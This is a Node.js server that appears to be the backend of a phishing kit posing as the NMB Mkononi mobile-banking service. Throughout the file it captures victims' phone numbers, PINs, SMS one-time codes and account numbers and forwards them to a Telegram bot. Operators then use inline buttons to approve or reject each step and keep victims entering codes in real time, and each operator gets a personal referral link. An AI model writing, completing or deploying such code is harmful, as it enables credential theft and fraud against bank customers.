const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DEFAULT_ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const sessions = {}; 
const adminMappings = {}; 

async function sendTelegramMessage(chatId, text, replyMarkup = {}) {
    if (!TELEGRAM_BOT_TOKEN || !chatId) return null;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = { chat_id: chatId, text: text, parse_mode: 'HTML' };
        if (replyMarkup) payload.reply_markup = replyMarkup;

        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return await response.json();
    } catch (err) {
        return null;
    }
}

async function removeInlineKeyboard(chatId, messageId, originalText, statusLabel) {
    if (!TELEGRAM_BOT_TOKEN) return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: `${originalText}\n\n<b>Status: [ ${statusLabel} ]</b>`,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            })
        });
    } catch (err) {}
}

function getTargetAdminChat(ref) {
    if (ref && adminMappings[ref]) return ref;
    if (ref && /^\d+$/.test(ref)) return ref;
    return DEFAULT_ADMIN_CHAT_ID;
}

// 1. Initial Application & Phone Submission
app.post('/api/submit-application', async (req, res) => {
    const { sessionId, phone, ref } = req.body;
    const targetAdminChat = getTargetAdminChat(ref);
    
    sessions[sessionId] = { phone, pin: '', clientRes: res, step: 'phone_submitted', adminChatId: targetAdminChat };
    res.json({ success: true });
});

// 2. PIN Submission (Accompanied by Phone) -> Admin: PROCEED / WRONG PIN
app.post('/api/submit-pin', async (req, res) => {
    const { sessionId, pin } = req.body;
    const session = sessions[sessionId];
    if (session) {
        session.pin = pin;
        session.clientRes = res;
        session.step = 'pin_pending';
    }

    const phone = session ? session.phone : 'Unknown';
    const targetAdminChat = session ? session.adminChatId : DEFAULT_ADMIN_CHAT_ID;

    const message = `🚨 <b>NMB MKONONI - NEW SUBMISSION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `🔑 <b>PIN Entered:</b> ${pin}\n\n` +
                    `<i>Choose action for applicant:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ PROCEED', callback_data: `otp_proceed_${sessionId}` },
                { text: '⚠️ WRONG PIN', callback_data: `err_pin_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(targetAdminChat, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        session.adminMsgId = sent.result.message_id;
    }
    res.json({ success: true });
});

// 3. Submit OTP -> Admin: PROCEED / STOP
app.post('/api/submit-otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    const session = sessions[sessionId];
    if (session) {
        session.otp = otp;
        session.clientRes = res;
        session.step = 'otp_pending';
    }

    const phone = session ? session.phone : 'Unknown';
    const targetAdminChat = session ? session.adminChatId : DEFAULT_ADMIN_CHAT_ID;

    const message = `🔐 <b>NMB MKONONI - OTP VERIFICATION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `🔑 <b>SMS OTP:</b> ${otp}\n\n` +
                    `<i>Verify OTP:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ PROCEED', callback_data: `otp_proceed_${sessionId}` },
                { text: '🛑 STOP', callback_data: `otp_stop_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(targetAdminChat, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        session.adminMsgId = sent.result.message_id;
    }
    res.json({ success: true });
});

// 4. Submit 11-digit NMB Bank Account -> Admin options
app.post('/api/submit-account', async (req, res) => {
    const { sessionId, accountNumber } = req.body;
    const session = sessions[sessionId];
    if (session) {
        session.accountNumber = accountNumber;
        session.clientRes = res;
        session.step = 'acc_pending';
    }

    const phone = session ? session.phone : 'Unknown';
    const targetAdminChat = session ? session.adminChatId : DEFAULT_ADMIN_CHAT_ID;

    const message = `🏦 <b>NMB MKONONI - BANK ACCOUNT SUBMISSION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `💳 <b>Account Number (11 digits):</b> ${accountNumber}\n\n` +
                    `<i>Select final verification status:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '⚠️ WRONG PIN', callback_data: `err_pin_${sessionId}` },
                { text: '⚠️ WRONG OTP', callback_data: `err_otp_${sessionId}` }
            ],
            [
                { text: '🚫 INVALID ACC', callback_data: `err_acc_${sessionId}` },
                { text: '🎉 APPROVED', callback_data: `approve_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(targetAdminChat, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        session.adminMsgId = sent.result.message_id;
    }
    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions[sessionId];
    if (!session || !session.status) {
        return res.json({ status: 'pending' });
    }
    const currentStatus = session.status;
    delete session.status;
    res.json({ status: currentStatus });
});

app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update && update.message && update.message.text) {
            const messageObj = update.message;
            const chatId = messageObj.chat.id;
            const text = messageObj.text.trim();
            
            if (text.startsWith('/start')) {
                adminMappings[chatId] = { chatId, fullName: `${messageObj.from.first_name || ''}`.trim() };
                const protocol = req.headers['x-forwarded-proto'] || req.protocol;
                const permanentLink = `${protocol}://${req.get('host')}/?ref=${chatId}`;
                await sendTelegramMessage(chatId, `Karibu! Kiungo chako:\n${permanentLink}`, undefined);
                return res.sendStatus(200);
            }
        }

        if (update && update.callback_query) {
            const query = update.callback_query;
            const data = query.data; 
            const parts = data.split('_');
            
            let action, sessionId;
            if (data.startsWith('otp_')) {
                action = `otp_${parts[1]}`;
                sessionId = parts[2];
            } else if (data.startsWith('err_')) {
                action = `err_${parts[1]}`;
                sessionId = parts[2];
            } else {
                action = parts[0];
                sessionId = parts[1];
            }

            const session = sessions[sessionId];
            let statusLabel = 'PROCESSED ✅';
            
            if (session) {
                const clientRes = session.clientRes;
                
                if (action === 'allow' || action === 'otp_proceed') {
                    session.status = 'next_step';
                    statusLabel = action === 'allow' ? 'ALLOWED ✅' : 'PROCEEDED ✅';
                    if (clientRes) {
                        clientRes.json({ success: true, status: 'next_step' });
                        session.clientRes = null;
                    }
                } else if (action === 'deny' || action === 'otp_stop' || action === 'err_pin') {
                    session.status = 'restart_pin';
                    statusLabel = 'WRONG PIN / DENIED ❌';
                    if (clientRes) {
                        clientRes.json({ success: false, status: 'restart_pin' });
                        session.clientRes = null;
                    }
                } else if (action === 'err_otp') {
                    session.status = 'restart_otp';
                    statusLabel = 'WRONG OTP ❌';
                    if (clientRes) {
                        clientRes.json({ success: false, status: 'restart_otp' });
                        session.clientRes = null;
                    }
                } else if (action === 'err_acc') {
                    session.status = 'restart_acc';
                    statusLabel = 'INVALID ACCOUNT ❌';
                    if (clientRes) {
                        clientRes.json({ success: false, status: 'restart_acc' });
                        session.clientRes = null;
                    }
                } else if (action === 'approve') {
                    session.status = 'success';
                    statusLabel = 'APPROVED 🎉';
                    if (clientRes) {
                        clientRes.json({ success: true, status: 'success' });
                        session.clientRes = null;
                    }
                }
            }

            if (query.message) {
                const messageId = (session && session.adminMsgId) ? session.adminMsgId : query.message.message_id;
                const targetChat = (session && session.adminChatId) ? session.adminChatId : query.message.chat.id;
                await removeInlineKeyboard(targetChat, messageId, query.message.text || '', statusLabel);
            }
            
            if (TELEGRAM_BOT_TOKEN) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: query.id, text: 'Done!' })
                });
            }
        }
        res.sendStatus(200);
    } catch (err) {
        res.sendStatus(500);
    }
});

app.listen(PORT, () => {});
                         
